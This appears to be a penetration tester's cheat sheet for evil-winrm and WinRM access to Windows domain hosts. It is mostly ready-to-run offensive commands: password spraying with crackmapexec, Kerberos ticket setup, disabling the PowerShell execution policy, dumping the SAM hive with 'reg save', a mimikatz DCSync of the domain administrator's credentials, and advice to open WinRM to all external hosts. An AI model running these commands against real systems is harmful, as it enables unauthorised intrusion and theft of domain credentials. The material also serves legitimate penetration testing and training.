## evil-winrm

{% hint style="info" %}
use **menu** to list commands, a useful one is **services**
{% endhint %}

## Check valid credentials

```bash
crackmapexec winrm $IP -u $USERS_FILE -p $PASS --continue-on-success
```

## Pass the Hash

## Kerberos auth

```sh
https://github.com/Hackplayers/evil-winrm#kerberos
sudo nvim /etc/krb5.conf
- Modify [libdefaults] 
- Also add the realm to [realms] both kdc and admin_server
- Just to be sure, add it to [domain-realms] as well

# Instead of editing the krb5.conf file manually, NetExec can generate it for us
nxc smb dc01.domain.com -k -u $USER -p $PASS --generate-krb5-file domain.krb5
sudo cp /etc/krb5.conf /etc/krb5.conf~
sudo cp domain.krb5 /etc/krb5.conf
# Obtain TGT and then use it on evil-winrm
KRB5CCNAME=user.ccache evil-winrm -i dc01.domain.com -r domain.com
```

## Unrestricted scripts / commands execution

{% code overflow="wrap" %}
```powershell
PowerUp → use downloadString to make it work appart from unrestricted execution policy
Set-ExecutionPolicy Unrestricted -Force
# To indicate our paths where we have PS scripts / exe binaries
-s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
-e, --executables EXES_PATH      C# executables local path
# Then on evil-winrm we type menu and since the app knows where PS/exes are we can execute them more easily
```
{% endcode %}

## Execute cmd commands on PS

```
cmd.exe /c reg save hklm\sam sam
PS> "binary.exe -p -l 455" | cmd
```

## Enable WinRM outside (AD/FW)

You can enable winrm but you will also need to allow it on the firewall and then also change the trusted hosts to be \* to allow IP addresses external of the network to connect.

## Mimikatz

```powershell
PS> .\mimikatz 'lsadump::dcsync /domain:.LOCAL /user:administrator' exit
```

## 5986 - WinRM (SSL)

```bash
# log in using evil-winrm (note port is 5986) and providing the public key (in this case the certificate key) and the private key
└─$ evil-winrm -i 10.10.10.10 -c pub-key.pem -k priv-key.pem -S -r domain.com -P 5986

# Authenticate against port 5986 (SSL)
evil-winrm -i 10.10.10.10 -u Administrator -p '$PASS' -S
```

## Bruteforce

```bash

# (check first if we have tried some creds with cme)
```
